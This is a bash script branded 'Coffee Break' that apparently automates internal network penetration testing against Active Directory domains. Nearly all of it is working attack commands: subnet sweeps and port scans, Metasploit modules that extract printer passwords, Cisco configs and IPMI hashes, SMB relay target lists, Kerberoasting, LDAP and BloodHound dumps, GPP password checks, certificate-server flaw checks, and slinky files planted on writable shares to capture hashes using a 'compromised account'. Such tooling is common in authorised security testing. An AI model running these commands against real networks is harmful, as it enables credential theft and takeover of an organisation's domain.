#!/bin/bash

echo " "
echo '                    (  )   (   )  )'
echo '                     ) (   )  (  ('
echo '                     ( )  (    ) )'
echo '                     _____________'
echo '                    <_____________> ___'
echo '                    |             |/ _ \'
echo '                    |               | | |'
echo '                    |               |_| |'
echo '                 ___|             |\___/'
echo '                /    \___________/    \'
echo '                \_____________________/'
echo '  ____        __  __           ______                _    '
echo '/  __ \      / _|/ _|          | ___ \              | |   '
echo '| /  \/ ___ | |_| |_ ___  ___  | |_/ /_ __ ___  __ _| | __'
echo '| |    / _ \|  _|  _/ _ \/ _ \ | ___ \ `__/ _ \/ _` | |/ /'
echo '| \__/\ (_) | | | ||  __/  __/ | |_/ / | |  __/ (_| |   < '
echo ' \____/\___/|_| |_| \___|\___| \____/|_|  \___|\__,_|_|\_\'                                                  
echo ' '
echo ' '
echo ' '
# List tool functions
#echo "This script will perform the following automatic functions:"
#echo " "
#echo "Inputs asked for..."
#echo "File with list of subnets. If not provided it will attempt to find them with ping sweeps for active gateway IPs."
#echo "FQDN Domain Name. If not provided it will attempt to discover it from /etc/reslolv.conf file."
#echo "Username and Password of compromised account if available, to facilitate additional functionality."
#echo " "
echo "Outputs..."
echo "FQDN Domain Name"
echo "Potential Domain Controller IP addresses"
echo "Null Session Output. Stored in ./domain/ folder"
echo "IPs of systems running SMB, Web ports, Cisco Smart Install, Konica Minolta Printers, & IPMI's Stored in ./scans/ folder."
echo "Metasploit modules ran to extract creds from..."
echo " - Cisco Smart Install devices"
echo " - Konica Minolta Printers"
echo " - IPMI's"
echo "Generates list of systems with SMB Signing Dissabled. Stored in ./scans/ folder."
echo "Runs Aquatone to pull screenshots of web servers and zips results as webs.zip in ./scans/ folder."
echo " "
echo "If compromised credentials are provided..."
echo "Pull SPN hashes from DC."
echo "Check DC for GPP Passwords."
echo "Perform LDAP dump from DC."
echo "Check for certificate server ESC vulnerabilities."
echo "Run Bloodhound data collections."
echo "Places slinky files on writable file shares."
echo " "
echo "The following tools are expected to be installed..."
echo " - enum4linux"
echo " - nmap"
echo " - crackmapexec"
echo " - ldapdomaindump"
echo " - impacket"
echo " - metasploit"
echo " - bloodhound-python"
echo " - certipy"
echo " - aquatone"
echo " - httprobe"
echo " - chromium"
echo " "
# Setting up directories
# Create working directory of temp files
mkdir temp
mkdir scans
mkdir domain
mkdir bloodhound

# Choose between auth, unauth, or all tasks
echo " "
echo " Select rather you want to run initial unauthenticated tasks, authenticated tasks, or both."
options=("Unauthenticated tasks" "Authencited tasks" "Both unauth & auth tasks" "Delete Previous Files" "Quit")



select opt in "${options[@]}"
do
    case $opt in
		"Unauthenticated tasks")

            # Prompt the user for domain name
            read -p "Enter the FQDN Domain Name (or press Enter to have tool try to generate it): " domain_name_input

            # Check if the user provided a domain name
            if [ -n "$domain_name_input" ]; then
                # Check if the file exists
                    if [ -f "$domain_name_input" ]; then
                    domain_name="$domain_name_input"
                        echo "Using the provided Domain Name:" $domain_name
                    else
                    echo "No domain name input found. Checking for domain."
                    cat /etc/resolv.conf | grep search | cut -d ' ' -f 2 > ./domain/domain-name
                    domain_name=$(<./domain/domain-name)
                    fi
            else
            echo "No Domain Name provided. Checking for domain."
            cat /etc/resolv.conf | grep search | cut -d ' ' -f 2 > ./domain/domain-name
            domain_name=$(<./domain/domain-name)

            fi

            # Get list of potential Domain Controllers
            host $domain_name  | cut -d ' ' -f 4 > ./domain/dc-ips
            echo "Domain = "$domain_name
            echo "Potential Domain Controlers:"
            cat ./domain/dc-ips

            # Prompt the user for a subnet file input
            read -p "Enter the path to the subnets file (or press Enter to have tool try to generate it): " subnet_file_input

            # Check for Null Sessions
            echo " "
            echo "Checking DCs for Null Sessions. This may throw some enum4linux error messages on the screen. Ignore them."
            echo " "
            file="./domain/dc-ips"
            while IFS= read -r dc_ip; do
            enum4linux -v $dc_ip > ./domain/null-session-$dc_ip
            done < "$file"
            echo " "
            echo "DC Null Session Check Complete. Files stored in ./domain/ folder."

            # Check if the user provided a subnet file
            if [ -n "$subnet_file_input" ]; then
                # Check if the file exists
                if [ -f "$subnet_file_input" ]; then
                    selected_subnet_file="$subnet_file_input"
                    echo " "
                    echo "Using the provided subnet file: $selected_subnet_file"
                else
                    echo "No subnet file found. Checking for active subnets."
                    # Get last octet of gateway address from route command
                    echo "Getting Gateway IP Address"
                    route | grep default | cut -d '.' -f 4 | cut -d ' ' -f 1 > ./temp/gateway

                    # Read the gateway digit from the file
                    gateway_digit=$(<./temp/gateway)

                    # Run Ping Sweeps and add to file  active-gateways
                    echo "Running Active Gateway Ping Sweep - this will take a while"
                    nmap -sP 192.168.0-255.$gateway_digit -T 4  | grep report | cut -d ' ' -f 5 > ./temp/active-gateways
                    nmap -sP 172.16-31.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    nmap -sP 10.0-255.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    echo "Active Gateway Ping Sweep Commplete"

                    # Devlop list of Active Subnets
                    echo "Building list of Active Subnets"
                    cat ./temp/active-gateways | cut -d '.' -f 1-3 > ./temp/active-gateways1
                    file="./temp/active-gateways1"
                    if [ ! -f "$file" ]; then
                        echo "File $file does not exist."
                        exit 1
                    fi
                    # Append ".0/24" to every line in the file
                    while IFS= read -r line; do
                        echo "$line.0/24"
                    done < "$file" > "$file.tmp"

                    # Move the temporary file back to the original file
                    mv "$file.tmp" "$file"
                    cp ./temp/active-gateways1 ./scans/active-subnets
                    selected_subnet_file="./scans/active-subnets"  # Set default subnet file
                fi
            else
                echo "No subnet file provided. Checking for active subnets."
                        # Get last octet of gateway address from route command
                    echo "Getting Gateway IP Address"
                    route | grep default | cut -d '.' -f 4 | cut -d ' ' -f 1 > ./temp/gateway

                    # Read the gateway digit from the file
                    gateway_digit=$(<./temp/gateway)

                    # Run Ping Sweeps and add to file  active-gateways
                    echo "Running Active Gateway Ping Sweep - this will take a while"
                    nmap -sP 192.168.0-255.$gateway_digit -T 4  | grep report | cut -d ' ' -f 5 > ./temp/active-gateways
                    nmap -sP 172.16-31.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    nmap -sP 10.0-255.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    echo "Active Gateway Ping Sweep Commplete"

                    # Devlop list of Active Subnets
                    echo "Building list of Active Subnets"
                    cat ./temp/active-gateways | cut -d '.' -f 1-3 > ./temp/active-gateways1
                    file="./temp/active-gateways1"
                    if [ ! -f "$file" ]; then
                        echo "File $file does not exist."
                        exit 1
                    fi
                    # Append ".0/24" to every line in the file
                    while IFS= read -r line; do
                        echo "$line.0/24"
                    done < "$file" > "$file.tmp"

                    # Move the temporary file back to the original file
                    mv "$file.tmp" "$file"
                    cp ./temp/active-gateways1 ./scans/active-subnets
                    selected_subnet_file="./scans/active-subnets"  # Set default subnet file
                selected_subnet_file="./scans/active-subnets"  # Set default file
            fi

            # Port Scans of active subnets and generate host lists
            echo "Running Port Scans - This will take a while"
            nmap -sS -p 445 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/smb-ips
            echo " "
            echo "SMB IP List:"
            cat ./scans/smb-ips
            nmap -sS -p 623 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/ipmi-ips
            echo " "
            echo "IPMI IP List:"
            cat ./scans/ipmi-ips
            nmap -sS -p 4786 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/cisco-smart-install-ips
            echo " "
            echo "Cisco Smart Install IP List:"
            cat ./scans/cisco-smart-install-ips
            nmap -sS -p 50001,50003 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/konica-minolta-ips
            echo " "
            echo "Konica Minolta Printer IP List:"
            cat ./scans/konica-minolta-ips
            nmap -sS -p 80,443,4443,8443,8000,8080 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/web-ips
            nmap -sS -p 1433 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/mssql-ips
            echo " "
            echo "MSSQL IP List:"
            cat ./scans/mssql-ips
            nmap -sS -p 389 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/ldap-ips
            echo " "
            echo "LDAP IP List:"
            cat ./scans/ldap-ips
            echo " "
            echo "Port Scans Completed. Output stored in ./scans/ folder."

            # Run Metasploit Modules
            echo " "
            echo "Running Metasploit Modules"
            echo "This will generate Rhost errors of no associated devices were discovered previously. Ignore the errors."
            echo " "
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 12345678; set SSL false; set RPORT 50001;run;exit' 
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 1234567812345678; set SSL false; set RPORT 50001;run;exit'
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 12345678; set SSL true; set RPORT 50003;run;exit'
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 1234567812345678; set SSL true; set RPORT 50003;run;exit'
            msfconsole -q -x 'use auxiliary/scanner/misc/cisco_smart_install;set rhosts file:./scans/cisco-smart-install-ips;set action DOWNLOAD;run;exit'
            msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes;set rhosts file:./scans/ipmi-ips;run;exit'

            # Generate SMB Signing Disabled Relay List
            echo " "
            echo "Generating smb-relay List"
            cme smb ./scans/smb-ips --gen-relay-list ./scans/relay-list
            echo " "
            echo "Relay list saved to ./scans/relay-list"
            echo " "

            # Generate Aquatone Web Report
            echo "Running Aquatone against web-ips"
            cd ./scans
            cat ./web-ips | httprobe -p 80,443,4443,8443,8000,8080 | /opt/aquatone/aquatone
            zip -r ./webs.zip *
            echo "Aquatone scan complete and results written to ./scans/webs.zip"
            cd ..
        ;;

        "Authencited tasks")

            # Prompt the user for domain name
            read -p "Enter the FQDN Domain Name (or press Enter to have tool try to generate it): " domain_name_input

            # Check if the user provided a domain name
            if [ -n "$domain_name_input" ]; then
                # Check if the file exists
                    if [ -f "$domain_name_input" ]; then
                    domain_name="$domain_name_input"
                        echo "Using the provided Domain Name:" $domain_name
                    else
                    echo "No domain name input found. Checking for domain."
                    cat /etc/resolv.conf | grep search | cut -d ' ' -f 2 > ./domain/domain-name
                    domain_name=$(<./domain/domain-name)
                    fi
            else
            echo "No Domain Name provided. Checking for domain."
            cat /etc/resolv.conf | grep search | cut -d ' ' -f 2 > ./domain/domain-name
            domain_name=$(<./domain/domain-name)

            fi

            # Get list of potential Domain Controllers
            host $domain_name  | cut -d ' ' -f 4 > ./domain/dc-ips
            echo "Domain = "$domain_name
            echo "Potential Domain Controlers:"
            cat ./domain/dc-ips

            # Prompt the user for compromised account name
            read -p "Enter the username of compromised account: " account_name_input

            # Prompt the user for compromised account password
            read -p "Enter the password of compromised account: " account_password_input
            
            # Check if the user provided an account name
            if [ -n "$account_name_input" ]; then
                # Check account credentials were provided
                if [ -n "$account_name_input" ]; then
                    account_name="$account_name_input"
                    echo "Using the provided Account Name:" $account_name

                    #pull SPNs
                    echo " "
                    echo "Pulling SPNs"
                    echo " "
                    dc_ip=$(head -n 1 ./domain/dc-ips)
                    echo "dc ip used is" $dc_ip
                    GetUserSPNs.py -request -dc-ip $dc_ip $domain_name/$account_name:$account_password_input > ./domain/spns
                    cat ./domain/spns
                    
                    # Dump LDAP
                    echo " "
                    echo "Dumping LDAP"
                    echo " "
                    cd ./domain/
                    ldapdomaindump -u $domain_name\\$account_name -p $account_password_input $dc_ip
                    cd ..
                    echo " "
                    echo "LDAP Domain Dump stored in ./domain/ folder."
                    echo " "

                    #Check for GPP Passwords on DC
                    echo "Checking for GPP Passwords on DC"
                    cme smb $dc_ip  -u $account_name -p $account_password_input -M gpp_password
                    echo " "

                    # Place Slinky files on file shares
                    echo "Placing slinky files name atestfile on all writable smb shares."
                    # Get IP address of host
                    host_ip=$(ip -o -4 addr show eth0 | awk '{print $4}' | cut -d '/' -f 1)
                    echo "Using host IP address of: " $host_ip
                    echo " "
                    cme smb ./scans/smb-ips -u $account_name -p $account_password_input -M slinky -o NAME=atestfile SERVER=$host_ip
                    echo " "
                    echo "======== To clean-up slinky files manually run this command ========"
                    echo " cme smb ./scans/smb-ips -u "$account_name" -p "$account_password_input" -M slinky -o NAME=atestfile SERVER="$host_ip" CLEANUP=True"

                    #Check for Certificate Server ESC vulnerabilities
                    echo "Checking Certificate Server"
                    cd ./domain/
                    certipy find -u $account_name@$domain_name -p $account_password_input
                    echo " "
                    echo "Checking for ESC Vulnerabilities. If displayed below, then vulnerable"
                    cat *Certipy.txt | grep ESC
                    cd ..
                    echo " "

                    #Collect Bloodhound Data
                    echo "Running Bloodhound Collections"
                    cd ./bloodhound/
                    bloodhound-python -u $account_name -p $account_password_input -d $domain_name -c all
                    echo " "
                    echo "Bloodhound data collection complete. Files stored in ./bloodhound/ folder."
                    cd ..
                    echo " "

                else
                    echo "No Account name  found."
                fi
            else
                echo "No Account Name provided."

            fi
        ;;

        "Both unauth & auth tasks")
            # Prompt the user for domain name
            read -p "Enter the FQDN Domain Name (or press Enter to have tool try to generate it): " domain_name_input
            
            # Prompt the user for compromised account name
            read -p "Enter the username of compromised account: " account_name_input

            # Prompt the user for compromised account password
            read -p "Enter the password of compromised account: " account_password_input

            # Check if the user provided a domain name
            if [ -n "$domain_name_input" ]; then
                # Check if the file exists
                    if [ -f "$domain_name_input" ]; then
                    domain_name="$domain_name_input"
                        echo "Using the provided Domain Name:" $domain_name
                    else
                    echo "No domain name input found. Checking for domain."
                    cat /etc/resolv.conf | grep search | cut -d ' ' -f 2 > ./domain/domain-name
                    domain_name=$(<./domain/domain-name)
                    fi
            else
            echo "No Domain Name provided. Checking for domain."
            cat /etc/resolv.conf | grep search | cut -d ' ' -f 2 > ./domain/domain-name
            domain_name=$(<./domain/domain-name)

            fi

            # Get list of potential Domain Controllers
            host $domain_name  | cut -d ' ' -f 4 > ./domain/dc-ips
            echo "Domain = "$domain_name
            echo "Potential Domain Controlers:"
            cat ./domain/dc-ips

            # Prompt the user for a subnet file input
            read -p "Enter the path to the subnets file (or press Enter to have tool try to generate it): " subnet_file_input

            # Check for Null Sessions
            echo " "
            echo "Checking DCs for Null Sessions. This may throw some enum4linux error messages on the screen. Ignore them."
            echo " "
            file="./domain/dc-ips"
            while IFS= read -r dc_ip; do
            enum4linux -v $dc_ip > ./domain/null-session-$dc_ip
            done < "$file"
            echo " "
            echo "DC Null Session Check Complete. Files stored in ./domain/ folder."

            # Check if the user provided a subnet file
            if [ -n "$subnet_file_input" ]; then
                # Check if the file exists
                if [ -f "$subnet_file_input" ]; then
                    selected_subnet_file="$subnet_file_input"
                    echo " "
                    echo "Using the provided subnet file: $selected_subnet_file"
                else
                    echo "No subnet file found. Checking for active subnets."
                    # Get last octet of gateway address from route command
                    echo "Getting Gateway IP Address"
                    route | grep default | cut -d '.' -f 4 | cut -d ' ' -f 1 > ./temp/gateway

                    # Read the gateway digit from the file
                    gateway_digit=$(<./temp/gateway)

                    # Run Ping Sweeps and add to file  active-gateways
                    echo "Running Active Gateway Ping Sweep - this will take a while"
                    nmap -sP 192.168.0-255.$gateway_digit -T 4  | grep report | cut -d ' ' -f 5 > ./temp/active-gateways
                    nmap -sP 172.16-31.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    nmap -sP 10.0-255.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    echo "Active Gateway Ping Sweep Commplete"

                    # Devlop list of Active Subnets
                    echo "Building list of Active Subnets"
                    cat ./temp/active-gateways | cut -d '.' -f 1-3 > ./temp/active-gateways1
                    file="./temp/active-gateways1"
                    if [ ! -f "$file" ]; then
                        echo "File $file does not exist."
                        exit 1
                    fi
                    # Append ".0/24" to every line in the file
                    while IFS= read -r line; do
                        echo "$line.0/24"
                    done < "$file" > "$file.tmp"

                    # Move the temporary file back to the original file
                    mv "$file.tmp" "$file"
                    cp ./temp/active-gateways1 ./scans/active-subnets
                    selected_subnet_file="./scans/active-subnets"  # Set default subnet file
                fi
            else
                echo "No subnet file provided. Checking for active subnets."
                        # Get last octet of gateway address from route command
                    echo "Getting Gateway IP Address"
                    route | grep default | cut -d '.' -f 4 | cut -d ' ' -f 1 > ./temp/gateway

                    # Read the gateway digit from the file
                    gateway_digit=$(<./temp/gateway)

                    # Run Ping Sweeps and add to file  active-gateways
                    echo "Running Active Gateway Ping Sweep - this will take a while"
                    nmap -sP 192.168.0-255.$gateway_digit -T 4  | grep report | cut -d ' ' -f 5 > ./temp/active-gateways
                    nmap -sP 172.16-31.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    nmap -sP 10.0-255.0-255.$gateway_digit -T 4 | grep report | cut -d ' ' -f 5 >> ./temp/active-gateways
                    echo "Active Gateway Ping Sweep Commplete"

                    # Devlop list of Active Subnets
                    echo "Building list of Active Subnets"
                    cat ./temp/active-gateways | cut -d '.' -f 1-3 > ./temp/active-gateways1
                    file="./temp/active-gateways1"
                    if [ ! -f "$file" ]; then
                        echo "File $file does not exist."
                        exit 1
                    fi
                    # Append ".0/24" to every line in the file
                    while IFS= read -r line; do
                        echo "$line.0/24"
                    done < "$file" > "$file.tmp"

                    # Move the temporary file back to the original file
                    mv "$file.tmp" "$file"
                    cp ./temp/active-gateways1 ./scans/active-subnets
                    selected_subnet_file="./scans/active-subnets"  # Set default subnet file
                selected_subnet_file="./scans/active-subnets"  # Set default file
            fi

            # Port Scans of active subnets and generate host lists
            echo "Running Port Scans - This will take a while"
            nmap -sS -p 445 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/smb-ips
            echo " "
            echo "SMB IP List:"
            cat ./scans/smb-ips
            nmap -sS -p 623 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/ipmi-ips
            echo " "
            echo "IPMI IP List:"
            cat ./scans/ipmi-ips
            nmap -sS -p 4786 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/cisco-smart-install-ips
            echo " "
            echo "Cisco Smart Install IP List:"
            cat ./scans/cisco-smart-install-ips
            nmap -sS -p 50001,50003 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/konica-minolta-ips
            echo " "
            echo "Konica Minolta Printer IP List:"
            cat ./scans/konica-minolta-ips
            nmap -sS -p 80,443,4443,8443,8000,8080 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/web-ips
            nmap -sS -p 1433 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/mssql-ips
            echo " "
            echo "MSSQL IP List:"
            cat ./scans/mssql-ips
            nmap -sS -p 389 -iL $selected_subnet_file -n --open -T 4 | grep report | cut -d ' ' -f 5 > ./scans/ldap-ips
            echo " "
            echo "LDAP IP List:"
            cat ./scans/ldap-ips
            echo " "
            echo "Port Scans Completed. Output stored in ./scans/ folder."

            # Run Metasploit Modules
            echo " "
            echo "Running Metasploit Modules"
            echo "This will generate Rhost errors of no associated devices were discovered previously. Ignore the errors."
            echo " "
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 12345678; set SSL false; set RPORT 50001;run;exit' 
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 1234567812345678; set SSL false; set RPORT 50001;run;exit'
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 12345678; set SSL true; set RPORT 50003;run;exit'
            msfconsole -q -x 'use auxiliary/gather/konica_minolta_pwd_extract;set rhosts file:./scans/konica-minolta-ips;set PASSWD 1234567812345678; set SSL true; set RPORT 50003;run;exit'
            msfconsole -q -x 'use auxiliary/scanner/misc/cisco_smart_install;set rhosts file:./scans/cisco-smart-install-ips;set action DOWNLOAD;run;exit'
            msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes;set rhosts file:./scans/ipmi-ips;run;exit'

            # Generate SMB Signing Disabled Relay List
            echo " "
            echo "Generating smb-relay List"
            cme smb ./scans/smb-ips --gen-relay-list ./scans/relay-list
            echo " "
            echo "Relay list saved to ./scans/relay-list"
            echo " "

            # Generate Aquatone Web Report
            echo "Running Aquatone against web-ips"
            cd ./scans
            cat ./web-ips | httprobe -p 80,443,4443,8443,8000,8080 | /opt/aquatone/aquatone
            zip -r ./webs.zip *
            echo "Aquatone scan complete and results written to ./scans/webs.zip"
            cd ..

            #   AUTHENTICATED TASKS START HERE

            # Check if the user provided an account name
            if [ -n "$account_name_input" ]; then
                # Check account credentials were provided
                if [ -n "$account_name_input" ]; then
                    account_name="$account_name_input"
                    echo "Using the provided Account Name:" $account_name

                    #pull SPNs
                    echo " "
                    echo "Pulling SPNs"
                    echo " "
                    dc_ip=$(head -n 1 ./domain/dc-ips)
                    echo "dc ip used is" $dc_ip
                    GetUserSPNs.py -request -dc-ip $dc_ip $domain_name/$account_name:$account_password_input > ./domain/spns
                    cat ./domain/spns
                    
                    # Dump LDAP
                    echo " "
                    echo "Dumping LDAP"
                    echo " "
                    cd ./domain/
                    ldapdomaindump -u $domain_name\\$account_name -p $account_password_input $dc_ip
                    cd ..
                    echo " "
                    echo "LDAP Domain Dump stored in ./domain/ folder."
                    echo " "

                    #Check for GPP Passwords on DC
                    echo "Checking for GPP Passwords on DC"
                    cme smb $dc_ip -u $account_name -p $account_password_input -M gpp_password
                    echo " "

                    # Place Slinky files on file shares
                    echo "Placing slinky files name atestfile on all writable smb shares."
                    # Get IP address of host
                    host_ip=$(ip -o -4 addr show eth0 | awk '{print $4}' | cut -d '/' -f 1)
                    echo "Using host IP address of: " $host_ip
                    echo " "
                    cme smb ./scans/smb-ips -u $account_name -p $account_password_input -M slinky -o NAME=atestfile SERVER=$host_ip
                    echo " "
                    echo "======== To clean-up slinky files manually run this command ========"
                    echo " cme smb ./scans/smb-ips -u "$account_name" -p "$account_password_input" -M slinky -o NAME=atestfile SERVER="$host_ip" CLEANUP=True"

                    #Check for Certificate Server ESC vulnerabilities
                    echo "Checking Certificate Server"
                    cd ./domain/
                    certipy find -u $account_name@$domain_name -p $account_password_input
                    echo " "
                    echo "Checking for ESC Vulnerabilities. If displayed below, then vulnerable"
                    cat *Certipy.txt | grep ESC
                    cd ..
                    echo " "

                    #Collect Bloodhound Data
                    echo "Running Bloodhound Collections"
                    cd ./bloodhound/
                    bloodhound-python -u $account_name -p $account_password_input -d $domain_name -c all
                    echo " "
                    echo "Bloodhound data collection complete. Files stored in ./bloodhound/ folder."
                    cd ..
                    echo " "

                else
                    echo "No Account name  found."
                fi
            else
                echo "No Account Name provided."

            fi
        ;;

        "Delete Previous Files")

            # clean-up previous files
            echo " "
            echo "**** Cleaning Up Previous Files ****"
            echo " "
            rm -rf ./temp/*
            rm -rf ./scans/*
            rm -rf ./domain/*
            rm -rf ./bloodhound/*
        ;;

        "Quit")
            break
        ;;
        *)
        esac
done


exit 0